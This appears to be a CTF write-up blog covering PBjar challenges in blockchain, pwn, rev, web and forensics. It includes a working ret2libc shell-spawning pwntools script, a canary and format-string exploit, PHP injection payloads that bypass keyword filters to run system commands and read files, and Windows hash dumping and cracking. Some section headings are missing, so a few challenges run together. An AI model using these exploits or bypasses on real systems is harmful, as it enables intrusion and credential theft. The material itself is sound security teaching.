## **Misc**

### **TechLead**


>Infamous YouTuber, and ex-Google / ex-Facebook TechLead found a quick way to make a few million dollars of a crypto scam (as a millionare). He created the ERC-20 token Million (MM), and started promoting it on his social media platforms. The deployer address of the Million token smart contract is the personal address of TechLead, what is the highest historical Ethereum balance of his personal address?
>
>Million Token: https://coinmarketcap.com/currencies/million/
>
>Flag format: flag{0.006942069420}
>
>Created by bruh.

A majority of the challenges in the Misc category were about blockchain so get
ready for some block investigation. For Techlead we are asked to find the highest
ETH balance of Techlead's wallet. To start, I began with a quick google search
to see if their wallet address popped up.

[![Google](/assets/pbjar/tech1.png)](/assets/pbjar/tech1.png)
<figcaption align=center><b>Figure 1-1: Google Search Results for "Techlead Wallet Address"</b></figcaption>
&nbsp;

Sure enough, the third link down had an etherscan link to a wallet. On the etherscan
page there is confirmation that this is probably the right address.

[![Mod Comment](/assets/pbjar/tech2.png)](/assets/pbjar/tech2.png)
<figcaption align=center><b>Figure 1-2: Etherscan.io Comment Section</b></figcaption>
&nbsp;

Now we just needed to find the highest balance. Luckily, etherscan has an analytics tab
that displays things like highest and lowest values.

[![Analytics](/assets/pbjar/tech3.png)](/assets/pbjar/tech3.png)
<figcaption align=center><b>Figure 1-3: Etherscan.io Analytics Tab</b></figcaption>
&nbsp;

This wallet had a historical high of 1.4625790953780384 ETH in it. All that's left was
to try the flag.

>flag{1.4625790953780384}

And success! The flag worked and the challenge was complete.

&nbsp;

### **readFlag1**

>The address of my new smart contract is 0xf0674CD7D1C0c616063a786E7d1434340E09BadD, the flag is inside it, and the code is published on Etherscan.
>
>Important: This smart contract is on Ropsten
>
>Created By: bruh.

The goal of this next challenge is to retrieve the flag from a smart contract on the
Ropsten test net. The first step was to look up 0xf0674CD7D1C0c616063a786E7d1434340E09BadD
on ropsten etherscan.

[![Contract](/assets/pbjar/reado1.png)](/assets/pbjar/reado1.png)
<figcaption align=center><b>Figure 2-1: Etherscan.io Smart Contract Page</b></figcaption>
&nbsp;

Next, I examined the contract further in the "Contract" tab to see if there were any
more details.

[![Tab](/assets/pbjar/reado2.png)](/assets/pbjar/reado1.png)
<figcaption align=center><b>Figure 2-2: Contract Details and Source Code</b></figcaption>
&nbsp;

Among the extra details, there is the source code and ABI for the contract. And just like the
description said the flag was right there in the code.

>flag{etherscan_S0urc3_c0de}

&nbsp;

### **readFlag2**

>I have republished the previous the contract at 0x585C403bC5c7eb62BF3630c7FeF1F837603bA866, but this time >no source code for you this time. Luckily, the ABI of the smart contract is the same as the previous one. >Figure out how to "get()" the flag.
>
>Important: This smart contract is on Ropsten
>
>Created By: bruh.

Part 2 of this set of readFlag challenges asks us to "get()" the flag from the smart contract.
A few important details are provided as well. First, obviously, the smart contract address.
Second, that the ABI (Application Binary Interface) is the same as the previous challenge.
On that second note, here is the previous challenge's ABI:

```
[{"inputs":[],"name":"get","outputs":[{"internalType":"string","name":"","type":"string"}],"stateMutability":"view","type":"function"}]
```

From how I understand it, the ABI is the smart contract equivalent of an API. So from here
I found 2 ways to proceed, 1) create a script using web3.js and call get() from the ABI, 2)
Use a site like https://justsmartcontracts.dev/#/ to do the call for me. I had no idea
how to make a script for this one so I chose option 2.

[![Smart Contracts](/assets/pbjar/readt1.png)](/assets/pbjar/readt1.png)
<figcaption align=center><b>Figure 3-1: JustSmartContracts Website</b></figcaption>
&nbsp;

The smart contracts site requires 2 pieces of information to work: an address and an ABI,
which is exactly what we have. From here it was as simple as adding a contract and
inputting the details, remembering to set the network id to Ropsten.

[![Details](/assets/pbjar/readt2.png)](/assets/pbjar/readt2.png)

>Created By: bruh.

This is the final challenge in this set of readFlag challenges and the goal of this one
is a bit ambiguous compared to the last. We are given another smart contract address and
need to find the flag somewhere in it. I began by checking it out on the Ropsten etherscan.

[![Contract](/assets/pbjar/readr1.png)](/assets/pbjar/readr1.png)
<figcaption align=center><b>Figure 4-1: Etherscan.io Smart Contract Page</b></figcaption>
&nbsp;

The contract is fairly similar to readFlag1 in terms of details. However, there are
a few more sections.

[![Sections](/assets/pbjar/readr2.png)](/assets/pbjar/readr2.png)
<figcaption align=center><b>Figure 4-2: Smart Contract Details - Constructor Arguments</b></figcaption>
&nbsp;

The few extra sections provide more details on the contract code and execution. Most importantly,
inside "Constructor Arguments" there are encoded and decoded function arguments. One of which
is the flag.

### **MEV**

>The miner of Block #12983883 on the Ethereum Blockchain partakes in the common practice of MEV. What is the exact amount of Ether that was transfered to the miner as a bribe from the transaction that was included first in this block?
>
>Info about MEV: https://ethereum.org/en/developers/docs/mev/
>
>Flag format: flag{0.006942069420}
>
>Created By: bruh.

MEV is a challenge with to examine an ETH miner to find a "bribe" of sorts.
We are given a block number where this all takes place as well as a link to information
about MEV.

	>Maximal (formerly "miner") extractable value (MEV) refers to the maximum value that can be
	>extracted from block production in excess of the standard block reward and gas fees by
	>including, excluding, and changing the order of transactions in a block.

With MEV the miner has control over what is/isn't allowed on the block and the order of
transactions. This means the miner could order a transaction first if they were "inclined" to.
With this in mind, I went on to examine the block.

[![Block](/assets/pbjar/mev1.png)](/assets/pbjar/mev1.png)
<figcaption align=center><b>Figure 5-1: Etherscan.io ETH Block Details</b></figcaption>
&nbsp;

Since there didn't appear to be anything referring to an obvious "bribe" on the
main page, I moved on to check the transactions on the block.

[![Transactions](/assets/pbjar/mev2.png)](/assets/pbjar/mev2.png)
<figcaption align=center><b>Figure 5-2: Transaction List for the Block</b></figcaption>
&nbsp;


Now assuming that this transaction order is sorted by latest completion, the first
transaction on the block should be at the end of this list.

[![Last Transaction](/assets/pbjar/mev3.png)](/assets/pbjar/mev3.png)
<figcaption align=center><b>Figure 5-3: The First Transactions on the Block</b></figcaption>
&nbsp;


There was a conspicuous entry mentioning MEV Bot at the end of the list. Which seemed like
a good place to start.

[![MEV Bot](/assets/pbjar/mev4.png)](/assets/pbjar/mev4.png)
<figcaption align=center><b>Figure 5-4: Transaction Details</b></figcaption>
&nbsp;


Transaction 0xddb777fbc72b8c3f31f687e302412c2f663b704bcf2faab5d938cd3f9c8b41f8 lists
a couple of transfers in its "Interacted With (To):" section. One of which, has the
miner's address. Sure enough, the transfer value was the "bribe" and the flag.

## **Pwn**

### **Ret2Libc**

>Ready to learn how to take ROP to the next level?
>
>Connect with "nc 143.198.127.103 42001".
>
>Created By: Rythm

The first pwn challenge, ret2libc, is a great tutorial challenge for anyone wanting
to learn how perform a ret2libc exploit. I really recommend trying it out if you want
to learn this technique. You can find the binary [here](/assets/pbjar/ret2libc) and the C code here [here](/assets/pbjar/ret2libc.c).

```python
from pwn import *

ip = '143.198.127.103'
port = 42001

p = connect(ip, port)


binary = ELF('./ret2libc')
context.binary = binary
rop = ROP(binary)
libc = ELF('./libc-2.31.so')


rop.raw('a'*40)
rop.puts(binary.got.puts)
rop.call(binary.entry)
print(rop.dump())

p.recvuntil(b'would you like to learn about ret2libc?[y/N]')

p.sendline(rop.chain())
p.recvuntil(b'I see, you must be a natural!\n')
p.recvline()
leaked_puts = p.recvline()[:8].strip()
print("Leaked puts@GLIBC: {}".format(leaked_puts))

leaked_puts = int.from_bytes(leaked_puts, byteorder='little')
libc.address = leaked_puts - libc.symbols.puts

rop2 = ROP(libc)
rop2.raw("a"*40)
rop2.call(rop.ret)
rop2.system(next(libc.search(b'/bin/sh\0')))


p.recvuntil(b'would you like to learn about ret2libc?[y/N]')
p.sendline(rop2.chain())


p.interactive()
```

I can't do nearly enough justice describing this as the tutorial. But the basic idea
here is to first leak libc addresses and then use them to invoke libc functions.
We usually end up invoking something like "system('/bin/sh')" in order to read the flag.
Here are the results of my solution and the resulting flag.

### **Walkthrough**

Walkthrough is a nice intro challenge to format strings and canary bypassing.
Much like ret2libc, walkthrough provides a well explained tutorial with a bunch
of hints (and some code) to help with the process of learning pwn challenges.
I definitely recommend checking it out for yourself if you want to learn these themes.
The binary can be found [here](/assets/pbjar/walkthrough) and the full C code [here](/assets/pbjar/walkthrough.c).   

```python
from pwn import *
e = ELF('./walkthrough')
p = connect('147.182.172.217', 42001)
p.recvuntil('later): ')
canary = int(p.recvline(keepends = False), 16) #keepends = False drop the newline character
p.sendline(b'a' * 72 + p64(canary) + b'a' * 8 + p64(e.sym['fmtstr'] + 1)) #figure out what x and y values should be

p.recvuntil(b'Input the string that will be passed into printf.')
p.sendline(b'%14$llx')
p.recvuntil(b'The printf result is:\n')
s = p.recvline().decode().strip()
number = int(s, 16)
p.recvuntil(b"Now input the value you're guessing.")
p.sendline(str(number))
p.interactive()
```

The challenge is divided into two halves. In the first half, we need to use a buffer
overflow and overwrite a stack canary to return to the start of part 2.
My solution uses the provided exploit code to solve the first half of the
challenge with a few values inserted in. The values 72 and 8  were found through
experimentation with gdb.

For part 2, we must use a format string vulnerability to print a previously randomly
generated number from the stack. Once we input the number the flag will print out.

## **Rev**

### **web**

>I downloaded this program back when the version number was still v1. It's been a long time... I heard the most recent update has the flag in it.
>
>Created By: eyangch

web is a Rev challenge... web is a Rev challenge where we are given a website link
that downloads an executable "v1" and are tasked with finding the most recent update for it. When
v1 is invoked it will "update" and download the next version of the program.

<div align="center"><a href="/assets/pbjar/version1.png"><img src="/assets/pbjar/version1.png"></a></div>
<figcaption align=center><b>Figure 8-1: Executing V1</b></figcaption>
&nbsp;


The problem is, who knows how many versions behind the program is. It could take a while to
manually update to the latest version. Next, I tried to skip ahead some versions by manipulating
the URL to download v3.

[![URL Manipulation](/assets/pbjar/version2.png)](/assets/pbjar/version2.png)
<figcaption align=center><b>Figure 8-2: Query Parameter to Download V3</b></figcaption>
&nbsp;

It turns out, I could access whichever version I wanted by changing the URL. So I used
this direct object reference "vulnerability" to see what happens when I input an insanely
large version number.

<div align="center"><a href="/assets/pbjar/version3.png"><img src="/assets/pbjar/version3.png"></a></div>
<figcaption align=center><b>Figure 8-3: Inputting a Large Version Number</b></figcaption>
&nbsp;

The site returns a "failed to find version message" meaning there is an actual limit to the
version numbers. All that I needed to do was find the last version number that downloads.
This boils down to a pass or fail condition, meaning, it should be able to be tested
with a binary search of sorts. The next step was to create a script to do this work for me.

```python
import requests, time

URL = 'http://147.182.172.217:42100/v{}'


def query(s):
  ret = None
  while ret is None:
    time.sleep(0.5)
    in_URL = URL.format(s)
    res = requests.get(in_URL).text
    if 'version not found' in res: ret = False
    else: ret = True
    print(ret)
  return ret

def binsearch(lo, hi):
    while lo < hi:
        mid = (hi+lo) // 2
        if query(mid):  
            lo = mid+1
        else:
            hi = mid
    return lo

def solve():
    print("Beginning Binary Search...")
    val = binsearch(3, 300000000000)
    print(val)

solve()
```

Based on the webserver's response, the script narrows down the search area, splitting the
search area in half each time. Eventually, the script will narrow the field down to the last
downloadable version number. The final step was to download this version and run it to get the
flag.

<figcaption align=center><b>Figure 9-1: ProgrammersHateProgramming Website</b></figcaption>
&nbsp;

ProgrammersHateProgramming is the first in a pair of challenges where we are tasked with
examining a note-taking application for vulnerabilities. When I first completed the challenge
there wasn't any source code available but later on, the admins provided it to make the challenge
less "guessy". Let's take a look at this code.

```php
<?php
if(isset($_POST["notewrite"]))
{
    $newnote = $_POST["notewrite"];
    $notetoadd = str_replace_first("<?php", "", $newnote);
    $notetoadd = str_replace_first("?>", "", $notetoadd);
    $notetoadd = str_replace_first("<script>", "", $notetoadd);
    $notetoadd = str_replace_first("</script>", "", $notetoadd);
    $notetoadd = str_replace_first("flag", "", $notetoadd);

    $filename = generateRandomString();
    array_push($_SESSION["notes"], "$filename.php");
    file_put_contents("$filename.php", $notetoadd);
    header("location:index.php");
}
?>
```

The source code reveals that this challenge is all based around PHP and is either
some form of PHP injection or XSS. The code also reveals that there is a blacklist of sorts.
The blacklist checks for the first occurrence of several sensitive keywords and tags.
Before the code was released, I was able to check for these filters by noticing what strings
got removed from the resulting note.

Luckily, this set of filters is pretty easy to bypass. Since it only checks for the first
occurrence, we can just put another set of "<?php" or "flag" at the front of our payload
to avoid it. To test this out I tried this POC:

```php
<?php<?php phpinfo(); ?>?>
```

And this was the resulting note:

[![Phpinfo Note](/assets/pbjar/prog5.png)](/assets/pbjar/prog5.png)
<figcaption align=center><b>Figure 9-2: phpinfo() Displayed by User Note</b></figcaption>
&nbsp;

So I guess the exploit works. The next move was to find the flag. Since I was able to inject
PHP commands and view the output, I could invoke a system command and look for the flag
on the server.

```php
<?php<?php system("ls"); ?>?>
```

The current directory looked like the place where all the notes are stored but unfortunately,
didn't contain any flags.

```php
<?php<?php system("ls /"); ?>?>
```

The root directory was a different story. It had a file named flag.php, which seemed
like a good file to look into. Note: remember that flag is a filtered word so we need to
bypass that as well as the PHP tags.

```php
flag<?php<?php system("cat flag.php"); ?>?>
```
[![Flag.php](/assets/pbjar/prog3.png)](/assets/pbjar/prog3.png)
<figcaption align=center><b>Figure 9-3: ProgrammersHateProgramming Flag</b></figcaption>
&nbsp;

And there it is, the really long and informative flag we were looking for.

### **ProgrammersHateProgramming 2**

>oh noes now there are more filters :((
>
>Created By: ZeroDayTea

The sequel to the previous ProgrammersHateProgramming challenge, ProgrammersHateProgramming 2
contains a beefed-up blacklist with a few new filters. This time the source code was
provided right from the beginning but still wouldn't take THAT much guessing to figure out.

```php
<?php
if(isset($_POST["notewrite"]))
{
    $newnote = $_POST["notewrite"];
    $notetoadd = str_replace_first("<?php", "", $newnote);
    $notetoadd = str_replace_first("?>", "", $notetoadd);
    $notetoadd = str_replace_first("<?", "", $notetoadd);
    $notetoadd = str_replace_first("flag", "", $notetoadd);

    $notetoadd = str_replace("fopen", "", $notetoadd);
    $notetoadd = str_replace("fread", "", $notetoadd);
    $notetoadd = str_replace("file_get_contents", "", $notetoadd);
    $notetoadd = str_replace("fgets", "", $notetoadd);
    $notetoadd = str_replace("cat", "", $notetoadd);
    $notetoadd = str_replace("strings", "", $notetoadd);
    $notetoadd = str_replace("less", "", $notetoadd);
    $notetoadd = str_replace("more", "", $notetoadd);
    $notetoadd = str_replace("head", "", $notetoadd);
    $notetoadd = str_replace("tail", "", $notetoadd);
    $notetoadd = str_replace("dd", "", $notetoadd);
    $notetoadd = str_replace("cut", "", $notetoadd);
    $notetoadd = str_replace("grep", "", $notetoadd);
    $notetoadd = str_replace("tac", "", $notetoadd);
    $notetoadd = str_replace("awk", "", $notetoadd);
    $notetoadd = str_replace("sed", "", $notetoadd);
    $notetoadd = str_replace("read", "", $notetoadd);
    $notetoadd = str_replace("ls", "", $notetoadd);
    $notetoadd = str_replace("ZeroDayTea is not hot", "", $notetoadd);

    $filename = generateRandomString();
    file_put_contents("$filename.php", $notetoadd);
    header("location:index.php");
}
?>
```

So this time the site had the same previous filters but also a few new ones that
filtered commands like cat. However, the filters aren't that effective again.
The new filters replace all occurrences of their keyword that they see, but they are
not recursive. This means we can "nest" a keyword within itself and it will only filter
the inner keyword. For example

>str_replace("cat", "", "ccatat") = cat
>
>or basically,
>
>ccatat ---> cat

All I needed to do was slightly adjust the payload from the previous challenge.

```php
flag<?php<?<?php system("ccatat /flag.php") ?>?>
```

### **cOrL**

>Descriptions are hard give me a break. (Think of common usernames and passwords for admin)

>Created By: ZeroDayTea

c0rL is a source-less web challenge that gives us a simple website.

[![Login Page](/assets/pbjar/corl1.png)](/assets/pbjar/corl1.png)
<figcaption align=center><b>Figure 11-1: c0rL Website Login Page</b></figcaption>
&nbsp;

The website initially presents a login page. The page source is mostly empty and doesn't
offer too many hints. Supposedly, the goal here is to break in through this login form.
The first thing to try with most of these is to try some common weak username-password
combinations.

[![admin](/assets/pbjar/corl2.png)](/assets/pbjar/corl2.png)
<figcaption align=center><b>Figure 11-2: Results from Inputting Common Username and Password</b></figcaption>
&nbsp;

Inputting the combination admin:admin resulted in the output in **Figure 11-2**. This output
provided a huge hint on what to do next. The keyword of the sentence "put" immediately reminded
me of the HTTP PUT method. The next step seemed to be to try sending the login as a PUT request
instead of the default POST.

[![PUT Request CURL](/assets/pbjar/corl3.png)](/assets/pbjar/corl3.png)
<figcaption align=center><b>Figure 11-3: cURL Command and Response From Server</b></figcaption>

I used cURL to craft the request but any other similar tool (burp, etc) would have worked.
The response to the PUT request contains just what we needed, the flag.

### **Hack NASA With HTML Mr. Inspector Sherlock**

>Created By: DefyGG

Presenting the next challenge, the ~~ugliest~~ best website ever! For this challenge we
are given a link to a website and must crawl through it to find parts of the flag.
To save everyone the eyesore, I will try to only include screenshots of web source code, it
is the only bit that matters in this challenge.

The theme of this challenge is inspecting web source for clues. That means looking through
the HTML code, style sheets, JavaScript, images, cookies, etc. It is important to be really thorough
and/or use tools to assist with this. I ended up finding the parts of the flag in reverse
order but here were their locations.

[![Flag Part 3](/assets/pbjar/sherlock1.png)](/assets/pbjar/sherlock1.png)
<figcaption align=center><b>Figure 12-1: Flag Part 3</b></figcaption>

To start the forensics category we have Stegosaurus stenops, a steganography challenge.
Supposedly, inside the given .jpg file there is a hidden flag.

[![Stego](/assets/pbjar/stegosaurus.jpg)](/assets/pbjar/stegosaurus.jpg)
<figcaption align=center><b>Figure 13-1: Given Challenge Image</b></figcaption>
&nbsp;

Upon initial inspection, the image shows nothing untoward. The next step for me was
to apply some tools to the file to see if there are any hints or flags in the open.
However, nothing worked out or gave any important details. Eventually, I looked up
some jpg steganography tools and tried out stegseek. My goal with stegseek was to attempt
to brute-force a password and extract anything hidden in the image.

[![Stegseek](/assets/pbjar/stegoflag.png)](/assets/pbjar/stegoflag.png)
<figcaption align=center><b>Figure 13-2: Stegseek Execution and Output</b></figcaption>

Stegseek quickly outputs a passphrase but also some hidden text into my output file.
The hidden text was the flag we were looking for.

Art Mystery starts with us investigating a png file. Let's take a look at the image.

<div align="center"><a href="/assets/pbjar/art2.png"><img src="/assets/pbjar/art2.png"></a></div>
<figcaption align=center><b>Figure 14-1: Broken art.png Image</b></figcaption>
&nbsp;

The file is broken and my image viewer says there is a CRC error in the IHDR chunk.
This means that some part of the IHDR does not match up with the picture's original CRC value.
To inspect further I tried using pngcheck on the file.

<div align="center"><a href="/assets/pbjar/art1.png"><img src="/assets/pbjar/art1.png"></a></div>
<figcaption align=center><b>Figure 14-2: Results of Pngcheck</b></figcaption>
&nbsp;

The error appears to be a result of the dimensions of the image being set to 0 x 0.
Unfortunately, pngcheck didn't reveal any potential fixes or values that would work.
So naturally, I just tried editing in a random one.

To preface this operation, I should explain a bit about the IHDR chunk. According to
[this resource](http://www.libpng.org/pub/png/spec/1.2/PNG-Chunks.html) the IHDR chunk will have the following qualities:

>The IHDR chunk must appear FIRST. It contains:
>
>   Width:              4 bytes
>   Height:             4 bytes
>   Bit depth:          1 byte
>   Color type:         1 byte
>   Compression method: 1 byte
>   Filter method:      1 byte
>   Interlace method:   1 byte

The important parts for this challenge are the width and height, which come right after the IHDR
header. Here's an example of what it looks like in a normal png file.

<div align="center"><a href="/assets/pbjar/art_ihdr.png"><img src="/assets/pbjar/art_ihdr.png"></a></div>
<figcaption align=center><b>Figure 14-3: Example IHDR Chunk</b></figcaption>
&nbsp;

**Figure 14-3** shows the example IHDR chunk with the width and height bytes highlighted. These values
are what I edited to attempt to fix the file. I put in some random values and tried pngcheck again.

<div align="center"><a href="/assets/pbjar/art4.png"><img src="/assets/pbjar/art4.png"></a></div>
<figcaption align=center><b>Figure 14-4: Pngcheck Reveals Proper CRC Value</b></figcaption>
&nbsp;

It's not a full fix, but it does reveal the CRC we need to get. So hopefully, all we need to do
is find the right width and height to satisfy the CRC. I found an excellent script [here](https://github.com/ARESxCyber/Writeups/blob/master/DarkCTF2020/crcket/readme.md) to
do the brute-forcing for me.

```python
from zlib import crc32

data = open("art.png",'rb').read()
index = 12

ihdr = bytearray(data[index:index+17])
width_index = 7
height_index = 11

for x in range(1,2000):
        height = bytearray(x.to_bytes(2,'big'))
        for y in range(1,2000):
                width = bytearray(y.to_bytes(2,'big'))
                for i in range(len(height)):
                        ihdr[height_index - i] = height[-i -1]
                for i in range(len(width)):
                        ihdr[width_index - i] = width[-i -1]
                if hex(crc32(ihdr)) == '0x60444cb6':
                        print("width: {} height: {}".format(width.hex(),height.hex()))
        for i in range(len(width)):
                        ihdr[width_index - i] = bytearray(b'\x00')[0]
```

The script will attempt all dimensions within a range and check the CRC value, printing out
every valid set of dimensions. Here is the script in action:

<div align="center"><a href="/assets/pbjar/art3.png"><img src="/assets/pbjar/art3.png"></a></div>
<figcaption align=center><b>Figure 14-5: Python Script Finds Proper Image Dimensions</b></figcaption>
&nbsp;

So for art.png we just need to edit into the IHDR "02b0" for both width and height and the picture
should be fixed. After a quick edit, I had a new, working picture and the flag.

### **Wirf die Gläser an die Wand**

>Our operatives managed to intercept this message. We know they've been transporting their
>plans over the network we infiltrated so there must be something here that we're not seeing.
>
>Created By: ZeroDayTea

For this challenge, we are given a single text file containing lyrics to Moskau by
Dschinghis Khan. Supposedly, somewhere hidden in this message, there is a flag we
need to find. I started by examining the file in a notepad.

[![notepad](/assets/pbjar/german1.png)](/assets/pbjar/german1.png)
<figcaption align=center><b>Figure 15-1: message.txt Inside Notepad</b></figcaption>
&nbsp;

Nothing seemed out of the ordinary so I moved on to examine the file's hex in xxd.

<div align="center"><a href="/assets/pbjar/moscow2.png"><img src="/assets/pbjar/moscow2.png"></a></div>
<figcaption align=center><b>Figure 15-2: xxd Results for message.txt</b></figcaption>
&nbsp;


The file has some extra whitespace characters hidden between the lines of lyrics.
Specifically, it contains extra spaces and tabs. Searching up whitespace steganography
revealed a tool called stegsnow which uses this same set of characters to encode a message.
Stegsnow appends tabs and spaces to the end of lines of text to hide the message.
Next, I tried running stegsnow against the message to see what was hiding there.

[![Stegsnow Round 1](/assets/pbjar/german3.png)](/assets/pbjar/german3.png)
<figcaption align=center><b>Figure 15-3: Stegsnow Results - No Password</b></figcaption>
&nbsp;


Unfortunately, stegsnow wasn't too keen on returning anything just yet. It either needed
a password for decoding or I was way off course. For passwords, nothing seemed more suitable
to me than the title of the song. So I tried stegsnow again with both the English and German
titles as passwords.

<div align="center"><a href="/assets/pbjar/moscow.png"><img src="/assets/pbjar/moscow.png"></a></div>
<figcaption align=center><b>Figure 15-4: Stegsnow Results - With Password</b></figcaption>

The German version of the password turned out to be the most effective and out popped
the flag.

### **tippy tappies**

>how'd you get this in the first place :eyes: dids you has logger on me?
>
>Created By: ZeroDayTea

Tippy tappies is a forensics challenge where we are given a capture of some USB frames.
To start, let's look at the capture in Wireshark.

[![USB Captures](/assets/pbjar/tippy1.png)](/assets/pbjar/tippy1.png)
<figcaption align=center><b>Figure 16-1: Wireshark View of tippytappies.pcapng</b></figcaption>
&nbsp;

The majority of the frames in the capture are USB protocol "URB_INTERRUPT in" frames.
Given how many of them there are, I felt it was a decent place to start my examination.

[![Interrupt in Frame](/assets/pbjar/tippy2.png)](/assets/pbjar/tippy2.png)
<figcaption align=center><b>Figure 16-2: URB_INTERRUPT Frame Examination</b></figcaption>
&nbsp;

The "interrupt in" frames contain a bunch of Human Interface Device (HID) data that shows the USB device
was a keyboard. Meaning this capture must be some sort of keylogging session. In **Figure 16-2**
there are two varieties of interrupt in frames - input and confirmation. Within the input frames,
we can see the exact key inputs that are sent from the device. For example, in **Figure 16-2** the user pressed
the "Enter" key. With this in mind, I narrowed down my search to just input frames using some filters.

[![Filter](/assets/pbjar/tippy3.png)](/assets/pbjar/tippy3.png)
<figcaption align=center><b>Figure 16-3: Wireshark Capture With Filters Applied</b></figcaption>
&nbsp;

I used a combination of filters to view frames with valid key input. Looking through
some of the input, it was highly likely that I was on the right track. By scrolling
through some of the frames you can make out phrases like "sudo apt-get" and "wechat".
From here there are two possible ways to move forward:

- Scroll through the input frames until the flag is found
- Create a script to output all the keys pressed

Both are completely valid ways to solve this problem but for a small "wow factor" and to save some eye strain I'll demo
a script for reading and decoding the frames. However, to simplify things, I needed to export only
the keyboard input frames into a new .pcapng file using "File -> Export Specified Packets".

```python
import re

# HID codes in decimal
hid_codes = {
        4: 'a', 5: 'b', 6: 'c', 7: 'd', 8: 'e', 9: 'f', 10: 'g',
        11: 'h', 12: 'i', 13: 'j', 14: 'k', 15: 'l', 16: 'm',
        17: 'n', 18: 'o', 19: 'p', 20: 'q', 21: 'r', 22: 's',
        23: 't', 24: 'u', 25: 'v', 26: 'w', 27: 'x', 28: 'y',
        29: 'z', 30: '1', 31: '2', 32: '3', 33: '4', 34: '5',
        35: '6', 36: '7', 37: '8', 38: '9', 39: '0', 40: '\n',
        42: '\b', 43: '\t', 44: ' ', 45: '-'
}

data = ""
with open('keyboard.pcapng', 'rb') as f:
    data = f.read()

# Regex find all blocks of 72 bytes starting with the header
key_frames = re.findall(b'\xc0\xcc\rf\xc5\x98\xff\xff.{64}', data, re.DOTALL)

# Extract first key code from the frame
key_codes = []
for frame in key_frames:
        # Remove double keystroke for readability
        if frame[-5] == 0:
            key_codes.append(frame[-6])

# Translate key codes to ASCII
result = ''
for key in key_codes:
    if key in hid_codes.keys():
        result += hid_codes[key]
print(result)
```

The script functions with the format of these specific frames in mind. Each frame consists
of 72 bytes with the first 8 bytes being a constant header of "c0 cc 0d 66 c5 98 ff ff".
Using regex the script finds all blocks matching these specific requirements.

The extracted blocks are then trimmed down to the keyboard input code. Aside from some special keys like
shift and ctrl, the data for keystrokes are located in the last 6 bytes. When a key is pressed
its corresponding HID scancode is placed in the first byte of the final 6 bytes. However,
if another key is pressed or held at the same time, its code will be placed in the second byte.
Since there are 6 bytes, for most keyboards a maximum of 6 keys can be pressed at the same time.

For this script specifically, we get the first key pressed and skip frames with double presses.
This is to avoid some repeating letters in the sequence. Finally using a dictionary of the HID scancodes
mentioned earlier, the script decodes the HID values into ASCII characters. You can find a full
set of scancodes [here](https://gist.github.com/MightyPork/6da26e382a7ad91b5496ee55fdc73db2).

Luna Guesser is an audio forensics challenge where we are given a single .wav file
and need to find the location it was sent from. The audio sounds pretty bizarre, parts of it
almost sound like connecting to dial-up internet.   

[Click Here to Listen to the Audio](/assets/pbjar/LunaGuesser.wav)

The trickiest part of this challenge is figuring out exactly what this noise is.
Given the name of the challenge and the description, I banked on the idea that
this sound had something to do with space or the moon. I searched for a while before
stumbling upon some interesting results.

[![Luna Decode](/assets/pbjar/luna2.png)](/assets/pbjar/luna2.png)
<figcaption align=center><b>Figure 17-1: Google Search For "Luna Signal Decode"</b></figcaption>
&nbsp;

My search "luna decode signal" mentioned slow-scan television (SSTV). SSTV is a method for
radio operators to send pictures to each other. But on a more interesting note, it has been used
quite a bit for transmitting images from space. Here is an example of what a usual SSTV
transmission sounds like.

[Click Here to Listen to an SSTV Signal Example](/assets/pbjar/sstv_example.wav)

The example should remind you of the original .wav file for this challenge. Now that we know what we are dealing with,
we just have to turn these sounds into a picture. There are a handful of tools available to perform this task.
I ended up using QSSTV but really any single one should work well enough. Next, I [piped the
audio into QSSTV](https://ourcodeworld.com/articles/read/956/how-to-convert-decode-a-slow-scan-television-transmissions-sstv-audio-file-to-images-using-qsstv-in-ubuntu-18-04) and tried to get a picture out of it.

<figcaption align=center><b>Figure 17-2: QSSTV Translating LunaGuesser.wav</b></figcaption>
&nbsp;

**Figure 17-2** shows the decoding in action. As the audio plays, the picture is created
line by line. Eventually, the full picture was rendered, revealing the secret location.

<figcaption align=center><b>Figure 17-3: Resulting SSTV Image - Buzz Aldrin on the Moon</b></figcaption>
&nbsp;

The output is a picture from the 1969 Moon Landing. So supposedly, the
location we are looking for is somewhere on the moon. Specifically, the moon landing site or somewhere near it.
A quick search turns up all we should need to solve this.

[![Moon landing search](/assets/pbjar/luna7.png)](/assets/pbjar/luna7.png)

There are a few options here to try:

- Tranquility Base
- Statio Tranquillitatis
- Mare Tranquillitatis

Trial and error is the best bet here. In the end, the correct answer turned out to
be option 3: Mare Tranquillitatis.

This forensics challenge involves extracting a password from a memory dump. To begin
I started up volatility to get an idea of what operating system profile I should use for this
analysis.

[![Vol.py](/assets/pbjar/meme1.png)](/assets/pbjar/meme1.png)
<figcaption align=center><b>Figure 18-1: Volatility - Finding Memory Profile</b></figcaption>
&nbsp;

Out of the 3 choices available I decided to go with the first one "WinXPSP2x86". Next, I tried
to get a dump of all the hashes from the file. To do this I used the hashdump plugin.  

[![Hashdump](/assets/pbjar/meme2.png)](/assets/pbjar/meme2.png)
<figcaption align=center><b>Figure 18-2: Volatility - Hashdump Results</b></figcaption>
&nbsp;

The Mimikatz plugin works even better for this task and skips a bit of work cracking the hashes.
Unfortunately, the plugin broke on my machine. Anyway, after a few seconds, 3 hashes popped out.
Since we are working with a Windows memory capture, all the hashes should be in the NTLM format.
To continue, I copied these hashes to a file and ran them through john the ripper.

[![John](/assets/pbjar/meme3.png)](/assets/pbjar/meme3.png)
<figcaption align=center><b>Figure 18-3: Cracking the Hashes with John the Ripper</b></figcaption>
&nbsp;

**Figure 18-3** shows the output of john the ripper. There is only 1 hash that john was able
to crack and nicely enough, it was the admin hash. This seemed like a good enough
guess at the flag and sure enough, it worked.

>Created By: ZeroDayTea

This next memory forensics challenge revolves around finding a phishing email within memory.
The goal of this challenge is to find the name of the one who sent the phishing email.
Like memedium, I first needed to get a profile name to use in volatility.

[![Profile](/assets/pbjar/robot1.png)](/assets/pbjar/robot1.png)
<figcaption align=center><b>Figure 19-1: Volatility - Finding Memory Profile</b></figcaption>
&nbsp;

Again, there are a few choices but the first one is fine by me. Next, I wanted to do a few things
to search for emails in the capture. First, I wanted to see if Outlook had a running process.
To check the processes in the capture I used the pslist plugin.

[![pslist](/assets/pbjar/robot2.png)](/assets/pbjar/robot2.png)
<figcaption align=center><b>Figure 19-2: Volatility - Pslist Results</b></figcaption>
&nbsp;

Luckily, Outlook was in memory so I could dump the memory specific to its process id.
Noting down the PID for outlook (3196), I used the memdump plugin to, well, dump the
memory.

[![memdump 3196](/assets/pbjar/robot3.png)](/assets/pbjar/robot3.png)
<figcaption align=center><b>Figure 19-3: Volatility - Executing Memdump</b></figcaption>
&nbsp;

